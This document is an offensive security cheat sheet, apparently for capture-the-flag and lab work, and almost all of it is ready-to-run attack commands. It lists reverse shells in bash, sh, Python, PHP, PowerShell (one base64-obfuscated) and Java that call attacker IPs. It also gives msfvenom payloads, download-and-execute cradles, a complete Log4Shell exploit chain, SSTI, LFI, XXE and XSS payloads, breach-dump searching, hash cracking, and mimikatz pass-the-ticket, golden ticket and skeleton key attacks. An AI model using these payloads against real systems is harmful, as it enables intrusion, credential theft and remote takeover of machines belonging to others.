# THE 1337 FILE
*****************


# ENCODING
## string to base64
``` bash
echo -n "string" | base64
```

## base64 to string
``` bash
echo -n "base64" | base64 -d
```

## string to hex
``` bash
echo -n "string" | xxd -r -p
```

# LEAK SEARCH
Search big leaks in a zipped way:
```bash
zgrep -a "@domain.de" BreachCompilation.tar.gz
```

# NETCAT
Listing for shells:
``` bash
nc -nvlp 1337
```

# HASHCAT
Crack bcrypt hashes:
```
hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt 
```

# MSFVENOM
Generate reverse shell exe:
``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f exe -o /home/kali/rev.exe
```

# start webserver
Host files:
``` bash
python3 -m http.server 8080
```

# POWERSHELL
Download reverse shell from source:
``` cmd
powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/rev.exe' -OutFile 'c:\Windows\Temp\rev.exe'"
powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/winPEAS.bat' -OutFile 'c:\Windows\Temp\lin.bat'"
```

``` powershell
Get-SmbShare
```

# WinPeas in memory
``` powershell
IEX(New-Object Net.WebClient).DownloadString('http://...')
```

# EVIL WinRM
Pass the hash:
``` bash
evil-winrm -i spookysec.local -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

# John The Ripper
Generate hash from files
``` bash
/path/other/xls2john excel.xls
zip2john zipfile.zip
```

Remove spaces and newlines:
``` bash
echo -n "$hash$xyz" | cut -d "-" -f 1 > hash.txt
```

## cracking hashes
``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt crack.hash
```

# Linux
## from user to root
``` bash
find / -perm +6000 2> /dev/null
```

## check apps you can run
``` bash
sudo -l
```

## read root files
``` bash
command_you_can_run --var-in-there="/root/flag.txt"
```

## core dumps
``` bash
ulimit -S -c unlimited
kill -11 pid
cat /var/crash/...
```

## proc
``` bash
/proc/net/tcp
/proc/sched_debug
/proc/pid/cmdline
```

# MINIMODEM
## ascii to WAV
``` bash
echo -n "string" | minimodem -t -f 1200.wav 1200
```

## wav to ascii
``` bash
minimodem -r -f 1200.wav 1200
```

# NMAP
## basic scan
``` bash
sudo nmap -sV -sS -sC host
```

## SNMP
``` bash
sudo nmap --script=snmp* -sU IP
```

## vulners script
Single target:

``` bash
nmap -sV --script vulners --script-args mincvss=9 host
```

Fast scanning a list of hosts:
``` bash
nmap --top-ports 100 --open -sV -T5 --script vulners --script-args mincvss=9 --stats-every 60s -iL domains.txt -oN nmap.txt
```

## nmap with searchsploit
``` bash
nmap -sV -sC host -oX host.xml
searchsploit --nmap host.xml
```

# SEARCHSPLOIT
``` bash
searchsploit "searchword"
searchsploit -m 123idofexploit
searchsploit -x 123idofexploit
```

# SQLMAP
Save full request with header and body in request.txt:
``` bash
sqlmap -R request.txt --batch --random-refer
```

# WPSCAN
## enumerate plugins, themes etc
``` bash
wpscan --url http://domain -e vp,dbe,cb
```

# REVERSE SHELL
Upgrade shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

## Bash
```
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

## SH
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.177 1337 >/tmp/f
rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Csh+-i+2%3E%261%7Cnc+10.10.14.177+1337+%3E%2Ftmp%2Ff
```

## Python
```
exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
```

## Windows
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```

## PHP
```
php -r '$sock=fsockopen("10.10.10.10",9001);exec("bash <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Powershell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```
echo "$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()%" | base64
```

# LOCAL FILE INCLUSION (PHP)
``` bash
php://filter/convert.base64-encode/resource=/etc/passwd
```

``` bash
String host="192.18.28.2";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

# Server side template injection
Nunjucks/Express:
``` javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```

# MONGODB
``` bash
mongo
show dbs
use dbname
db.dbname.find()
```
# LOG4J (Log4Shell exploit)

## Install and start LDAP server that redirects to your exploit class:
https://github.com/mbechler/marshalsec

``` bash
git clone https://github.com/mbechler/marshalsec.git
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.IP:8000/#Exploit"
```

## Save exploit class to Exploit.java:
``` java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP 1337");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## Compile exploit to Javacode:
``` bash
javac Exploit.java
```

## Host Javacode with python:
``` bash
python3 -m http.server
```

## Wait for reverse shell:
``` bash
nc -lnvp 1337
```

## Trigger Log4J to connect with your LDAP:
``` bash
curl 'http://TARGET:8983/?foo=${jndi:ldap://YOUR.IP:1389/Exploit\}'
```

## Extract information from log4j:
``` text
${jndi:${lower:l}${lower:d}a${lower:p}://xx.interactsh.com/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.interactsh.com/poc}
```

# ENUM4LINUX
``` bash
enum4linux 10.10.82.233
```

# SMBCLIENT
``` bash
smbclient \\\\ip\\nt4wrksv
```

# WINDOWS
Kerbrute: https://github.com/ropnop/kerbrute
``` bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

Impacket: https://github.com/SecureAuthCorp/impacket
``` bash
python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
```

## PowerView
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
``` powershell
Get-NetUser | select cn
Get-NetGroup -GroupName *admin*
```

# MIMIKATZ
mimikatz.exe, `privilege::debug` = 20?
Export ticket:
``` bash
sekurlsa::tickets /export
```

Pass the ticket:
``` mimikatz
kerberos::ptt <ticket>
```
``` cmd
exit
klist
dir \\ip\admin$
```
Golden/silver ticket:
``` mimikatz
lsadump::lsa /inject /name:krbtgt
Kerberos::golden /user:Administrator /domain:controller.local /sid:$SID /krbtgt:$NTLM /id:$USERID
```
Golden/silver ticket to access other machines:
``` mimikatz
misc::cmd
```

Skeleton key (every User-PW: mimikatz):
``` mimikatz
misc::skeleton
```

# XSS
``` html
"'><script>alert(1)</script>
“”;</script><script>alert(/XSS/)</script><“
"';</script><script>alert(/XSS/)</script><"
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
%22%27%3E%3C%68%31%3E%78%73%73%3C%2F%68%31%3E
&#x22;&#x27;&#x3E;&#x3C;&#x68;&#x31;&#x3E;&#x78;&#x73;&#x73;&#x3C;&#x2F;&#x68;&#x31;&#x3E;
&#34&#39&#62&#60&#104&#49&#62&#120&#115&#115&#60&#47&#104&#49&#62
```

# XXE
XML external entities:
``` xml
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
```

